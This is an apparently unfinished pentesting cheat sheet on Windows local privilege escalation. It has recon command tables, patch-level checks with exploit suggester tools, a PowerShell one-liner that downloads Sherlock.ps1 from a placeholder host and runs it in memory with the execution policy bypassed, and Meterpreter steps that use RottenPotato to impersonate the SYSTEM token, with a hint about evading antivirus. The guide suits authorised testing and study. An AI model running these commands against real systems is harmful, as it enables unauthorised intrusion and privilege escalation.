# Windows - Local Privilege Escalation

### Recon

###### Initial recon

The following commands can be used to grasp a better understanding of the
current system:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| **OS details**  | systeminfo | [environment]::OSVersion.Version ||
| **Hostname**  | hostname | $env:ComputerName<br/>(Get-WmiObject Win32_ComputerSystem).Name ||
| **Curent Domain** | echo %userdomain% | $env:UserDomain<br/>(Get-WmiObject Win32_ComputerSystem).Domain ||
| **Curent User**  | whoami<br/>echo %username% | $env:UserName<br/>(Get-WmiObject Win32_ComputerSystem).UserName | |
| **Curent User details**  | whoami /all<br/>net user *username* | | |
| **List host local users**  | net users |  | wmic USERACCOUNT list full |
| **List host local groups** | net localgroup | *(Win10+)* Get-LocalGroup | wmic group list full |
| **Local admin users** | net localgroup Administrator | | |
| **Connected users** | qwinsta | | |
| **Powershell version**  | Powershell  $psversiontable | $psversiontable ||
| **Environement variables** | set | Get-ChildItem Env: &#124; ft Key,Value ||
| **Credential Manager** | cmdkey /list | | |
| **Mounted disks** | | | wmic volume get DriveLetter,FileSystem,Capacity |
| **Writable directories** | dir /a-rd /s /b | | |
| **Writable files** | dir /a-r-d /s /b | | |

###### Patching level

The following commands or actions can be used to get the updates installed on
the host:

| DOS | Powershell | WMI |
|-----|------------|-----|
| systeminfo<br/> Check content of C:\Windows\SoftwareDistribution\Download<br/>type C:\Windows\WindowsUpdate.log | Get-HotFix | wmic qfe get Caption,Description,HotFixID,InstalledOn |

###### Process, services, installed programs and scheduled tasks

The following commands can be used to retrieve the process, services,
installed programs and scheduled tasks of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| **Process** | tasklist | get-process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |

###### Network

The following commands can be used to retrieve information about the network
interfaces and active connections of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|


### Exploit

###### Physical access

###### Misc

###### File system exploration

###### File transfer to the host

###### File transfer from the host

###### Unpatched system

Compare patch level to public known exploits offclient:

** Windows Exploit Suggester **

The windows-exploit-suggester tool compares a targets patch levels against the
Microsoft vulnerability database in order to detect potential missing patches
on the target.  
It also notifies the user if there are public exploits and Metasploit modules
available for the missing bulletins.  
It requires the 'systeminfo' command output from a Windows host in order to
compare that the Microsoft security bulletin database and determine the patch
level of the host.  
It has the ability to automatically download the security bulletin database
from Microsoft with the --update flag, and saves it as an Excel spreadsheet.

```
# python windows-exploit-suggester.py --update

python /opt/priv_esc/windows/windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO>
```

If the 'systeminfo' command reveals 'File 1' as the output for the hotfixes,
try executing 'wmic qfe list full' and feed that as input with the --hotfixes
flag, along with the 'systeminfo':

```
python windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO> --hotfixes <HOTFIXES>
```

**Sherlock**

PowerShell script to find missing software patches for critical vulnerabilities
that could be leveraged for local privilege escalation.

To download and execute directly into memory:

```
# CMD
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1')"; Find-AllVulns

# PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1'); Find-AllVulns
```

** Metasploit - Local Exploit Suggester **

The Local Exploit Suggester module suggests local meterpreter exploits that can
 be used against the target, based on the architecture and platform as well as
 the available exploits in meterpreter.

 ```
meterpreter > run post/multi/recon/local_exploit_suggester

# OR

msf > use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set SESSION <session-id>
msf post(local_exploit_suggester) > run
```

###### System misconfigurations exploits

###### Unquoted services path

###### Writable services and services files

###### AlwaysInstallElevated

###### Token Privileges abuse

Use the following command to retrieve the current user account token privileges:
```bash
whoami /priv
```
*Vulnerable tokens*

The following tokens can be exploited to gain SYSTEM access privileges:
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

*Rotten Potato w/ Metasploit*

RottenPotato can be used in combination with the Metasploit meterpreter
incognito module to abuse the privileges above in order to elevate privilege to
SYSTEM.

Source: https://github.com/breenmachine/RottenPotatoNG

```bash
# Load the incognito module to toy with tokens
meterpreter > load incognito

# Upload the MSFRottenPotato binary on the target
# Some obfuscation may be needed in order to bypass AV
meterpreter > upload MSFRottenPotato.exe .

# The command may need to be run a few times
meterpreter > execute -f 'MSFRottenPotato.exe'

# The NT AUTHORITY\SYSTEM token should be available as a delegation token
# Even if the token is not displayed it might be available and the impersonation should be tried anyway
meterpreter > list_tokens -u
meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
```

*LonelyPottato (RottenPotato w/o Metasploit)*
